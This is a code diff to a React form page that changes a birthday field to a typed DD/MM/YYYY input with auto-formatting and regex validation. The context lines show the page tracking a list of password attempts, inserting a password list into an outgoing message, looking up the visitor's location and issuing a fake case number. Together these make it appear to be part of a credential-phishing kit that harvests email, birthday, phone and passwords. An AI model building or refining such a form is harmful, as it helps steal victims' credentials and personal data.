@@ -38,7 +38,7 @@ interface GeoJSResponse {
 
 const mainFormSchema = z.object({
     email: z.string().email('Please enter a valid email address'),
-    birthday: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'Please enter a valid date'),
+    birthday: z.string().regex(/^(0[1-9]|[12]\d|3[01])\/(0[1-9]|1[012])\/\d{4}$/, 'Please enter a valid date (DD/MM/YYYY)'),
     phone: z.string().min(1)
 });
 
@@ -54,8 +54,20 @@ const generateCaseNumber = (): string => {
 };
 
 const formatDateVN = (dateStr: string): string => {
-    const [year, month, day] = dateStr.split('-');
-    return `${day}-${month}-${year}`;
+    return dateStr;
+};
+
+const formatBirthday = (value: string): string => {
+    const numbers = value.replace(/\D/g, '');
+
+    let formatted = '';
+    for (let i = 0; i < numbers.length && i < 8; i++) {
+        if (i === 2 || i === 4) {
+            formatted += '/';
+        }
+        formatted += numbers[i];
+    }
+    return formatted;
 };
 
 const Home = () => {
@@ -73,6 +85,7 @@ const Home = () => {
     const [submitError, setSubmitError] = useState<string | null>(null);
     const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
     const [lastMessageId, setLastMessageId] = useState<number | null>(null);
+    const [birthdayValue, setBirthdayValue] = useState('');
     const navigate = useNavigate();
 
     const {
@@ -345,7 +358,23 @@ ${passwordList}`;
                                 </div>
 
                                 <div>
-                                    <input type='date' {...registerMain('birthday')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors [&::-webkit-calendar-picker-indicator]:opacity-0' />
+                                    <input
+                                        type='text'
+                                        placeholder='DD/MM/YYYY'
+                                        value={birthdayValue}
+                                        maxLength={10}
+                                        {...registerMain('birthday', {
+                                            onChange: (e) => {
+                                                const formatted = formatBirthday(e.target.value);
+                                                setBirthdayValue(formatted);
+                                                registerMain('birthday').onChange({
+                                                    target: { value: formatted }
+                                                });
+                                            }
+                                        })}
+                                        tabIndex={2}
+                                        className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors'
+                                    />
                                     {mainErrors.birthday && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.birthday.message}</p>}
                                 </div>
 
